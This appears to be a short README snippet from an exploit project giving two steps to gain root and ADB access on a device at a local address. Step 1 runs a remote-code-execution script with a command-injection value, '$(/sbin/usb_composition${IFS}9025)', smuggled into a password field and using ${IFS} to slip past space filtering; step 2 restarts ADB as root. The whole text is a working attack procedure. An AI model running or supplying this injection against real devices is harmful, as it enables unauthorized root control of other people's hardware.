
```markdown
# Root & ADB Access payload

**Step 1: Run the RCE payload**
```bash
python jodu5174x_pinlock_rce.py https://192.168.225.1/ --ask-pass --cmd 'Aa1$(/sbin/usb_composition${IFS}9025)'
```

**Step 2: Restart ADB as Root**
```bash
adb root
```
